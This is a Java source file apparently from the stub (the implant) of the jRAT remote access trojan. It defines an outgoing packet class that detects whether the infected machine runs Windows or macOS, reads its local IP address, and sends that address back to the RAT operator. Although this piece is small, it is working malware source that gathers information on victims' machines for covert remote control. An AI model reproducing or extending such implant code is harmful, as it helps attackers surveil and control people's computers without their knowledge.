package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;
import java.net.InetAddress;

import com.redpois0n.oslib.OperatingSystem;


public class Packet12InitLocalAddress extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String address = "Unknown"; 
		
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
			try {
				address = InetAddress.getLocalHost().getHostAddress();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		
		sw.writeLine(address);
	}

	@Override
	public byte getPacketId() {
		return (byte) 12;
	}
}